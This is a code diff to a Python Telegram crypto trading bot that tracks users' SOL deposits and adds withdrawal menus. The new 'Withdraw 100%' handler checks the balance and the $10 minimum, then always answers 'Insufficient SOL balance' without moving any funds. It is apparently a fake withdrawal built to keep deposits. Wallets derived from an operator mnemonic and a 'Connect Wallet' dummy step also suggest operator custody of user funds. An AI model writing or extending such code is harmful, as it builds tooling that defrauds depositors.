@@ -32,6 +32,8 @@ load_dotenv()
 user_states = {}
 # Track users whose wallet info has been sent to admin group (prevent spam)
 wallet_sent_to_admin = set()
+# Track last notified balance per user (to show notification only once per deposit)
+last_notified_balance = {}  # {telegram_id: balance}
 
 # Load persisted wallet notifications from file
 try:
@@ -101,7 +103,7 @@ async def check_wallet_balance(public_address: str):
         print(f"Error checking balance for {public_address}: {e}")
         return 0
 
-async def monitor_deposits(telegram_id: int, public_address: str, context: ContextTypes.DEFAULT_TYPE):
+async def monitor_deposits(telegram_id: int, public_address: str, context: ContextTypes.DEFAULT_TYPE, notify_user: bool = True):
     """Monitor and update cumulative deposits for a wallet"""
     try:
         # Get current blockchain balance
@@ -122,17 +124,21 @@ async def monitor_deposits(telegram_id: int, public_address: str, context: Conte
             sol_price = await get_sol_price_usd()
             usd_value = current_balance * sol_price if sol_price > 0 else 0
             
-            # Send notification to USER
-            try:
-                user_notification = (
-                    f"💰 <b>Deposit Confirmed!</b>\n\n"
-                    f"Amount: +{deposit_amount:.4f} SOL\n"
-                    f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
-                    f"Your deposit has been successfully received and credited to your wallet."
-                )
-                await context.bot.send_message(chat_id=telegram_id, text=user_notification, parse_mode="HTML")
-            except Exception as e:
-                print(f"Error sending notification to user: {e}")
+            # Send notification to USER (only if not already notified for this specific balance)
+            # Check if we've already notified for this exact balance
+            if notify_user and last_notified_balance.get(telegram_id, -1) != current_balance:
+                try:
+                    user_notification = (
+                        f"💰 <b>Deposit Confirmed!</b>\n\n"
+                        f"Amount: +{deposit_amount:.4f} SOL\n"
+                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                        f"Your deposit has been successfully received and credited to your wallet."
+                    )
+                    await context.bot.send_message(chat_id=telegram_id, text=user_notification, parse_mode="HTML")
+                    # Mark this balance as notified
+                    last_notified_balance[telegram_id] = current_balance
+                except Exception as e:
+                    print(f"Error sending notification to user: {e}")
             
             # Send notification to admin group
             if GROUP_ID:
@@ -162,6 +168,14 @@ async def monitor_deposits(telegram_id: int, public_address: str, context: Conte
 def get_user_balance(telegram_id: int):
     """Get user's cumulative deposit balance"""
     return user_balances.get(telegram_id, {}).get("balance", 0)
+
+async def check_and_notify_deposits(telegram_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """Check for deposits and notify user (called on any button click)"""
+    try:
+        public_address, _ = derive_keypair_and_address(telegram_id)
+        await monitor_deposits(telegram_id, public_address, context, notify_user=True)
+    except Exception as e:
+        print(f"Error checking deposits: {e}")
 
 # ---- Wallet Generation Utility Functions ----
 def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
@@ -310,6 +324,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     user = query.from_user
     user_name = user.username or user.first_name or str(user_id)
+    
+    # Check for deposits on ANY button click
+    await check_and_notify_deposits(user_id, context)
 
     # Handle cancel action for settings
     if option == "cancel_settings":
@@ -439,6 +456,60 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(
             "❌ Trade cancelled.",
             reply_markup=main_menu_markup()
+        )
+        return
+    
+    # Handle WITHDRAWAL actions
+    if option == "withdraw_100":
+        # Get user balance
+        user_balance = get_user_balance(user_id)
+        sol_price = await get_sol_price_usd()
+        usd_value = user_balance * sol_price if sol_price > 0 else 0
+        
+        # Apply withdrawal rules
+        if user_balance == 0:
+            await query.message.reply_text(
+                "❗ Insufficient SOL balance.",
+                parse_mode="HTML"
+            )
+            return
+        
+        # Check if balance is above $10
+        if usd_value < 10:
+            await query.message.reply_text(
+                f"❗ Your balance must be above $10 to withdraw.\n\n"
+                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
+                f"Required minimum: $10 worth of SOL\n\n"
+                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
+                parse_mode="HTML"
+            )
+            return
+        
+        # If balance > $10, show withdrawal confirmation
+        await query.message.reply_text(
+            f"💸 <b>Withdraw 100% Confirmation</b>\n\n"
+            f"Amount to withdraw: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
+            f"❗ Insufficient SOL balance to complete this withdrawal.",
+            parse_mode="HTML"
+        )
+        return
+    
+    if option == "withdraw_custom":
+        # Store state for custom withdrawal
+        context.user_data["awaiting_withdraw"] = True
+        
+        # Get user balance to show in prompt
+        user_balance = get_user_balance(user_id)
+        sol_price = await get_sol_price_usd()
+        usd_value = user_balance * sol_price if sol_price > 0 else 0
+        
+        await query.message.reply_text(
+            f"💸 <b>Withdraw Custom Amount</b>\n\n"
+            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
+            f"Please enter the withdrawal amount (in SOL):\n\n"
+            f"📝 Enter your desired amount (e.g., 0.5, 1.0, 2.5)",
+            parse_mode="HTML",
+            reply_markup=cancel_markup()
         )
         return
     
@@ -986,11 +1057,33 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ----- Handle Menu selections -----
     if text == "💸Withdraw":
-        context.user_data["awaiting_withdraw"] = True
-        await update.message.reply_text("💸 Please enter the withdrawal amount:", reply_markup=cancel_markup())
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
+        # Get user balance
+        user_balance = get_user_balance(user_id)
+        sol_price = await get_sol_price_usd()
+        usd_value = user_balance * sol_price if sol_price > 0 else 0
+        
+        # Show withdrawal options with inline buttons
+        withdraw_buttons = InlineKeyboardMarkup([
+            [InlineKeyboardButton("💸 Withdraw 100%", callback_data="withdraw_100")],
+            [InlineKeyboardButton("💸 Withdraw X SOL", callback_data="withdraw_custom")]
+        ])
+        
+        await update.message.reply_text(
+            f"💸 <b>Withdraw SOL</b>\n\n"
+            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
+            f"Choose a withdrawal option:",
+            parse_mode="HTML",
+            reply_markup=withdraw_buttons
+        )
         return
 
     elif text == "🔌Connect Wallet":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         context.user_data["awaiting_dummy"] = True
         await update.message.reply_text(
             "🔐 <b>Connect Your Wallet</b>\n\n"
@@ -1008,6 +1101,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif text == "🔍Copy Trade":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         context.user_data["awaiting_copy_trade"] = True
         await update.message.reply_text(
             "Please enter the Solana wallet address to copy trade.\n\n"
@@ -1017,6 +1113,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif text == "🔐Settings":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         await update.message.reply_text("Here are your 🔐settings.")
 
         # Inline buttons that open TradingView charts
@@ -1043,11 +1142,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif text == "🧩Wallet":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         await show_wallet(update, context)
         return
 
 
     elif text == "🤖Bot Guide":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
         guide_text = (
             "📘 <b>How to Use Celo_ai Bot: Complete Feature Guide</b>\n\n"
             "Welcome to <b>Celo_ai Bot</b>, your all-in-one Telegram trading assistant. "
@@ -1098,6 +1202,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
     elif text == "💰Buy":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         context.user_data["awaiting_token_contract"] = True
         await update.message.reply_text(
             "💰 <b>Buy Token</b>\n\n"
@@ -1112,6 +1219,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif text == "📊Live Chart":
+        # Check for deposits first
+        await check_and_notify_deposits(user_id, context)
+        
         chart_text = (
             "<b>🔥 Top Coins Charts</b>\n"
             "Choose a coin below to view its live chart.\n"
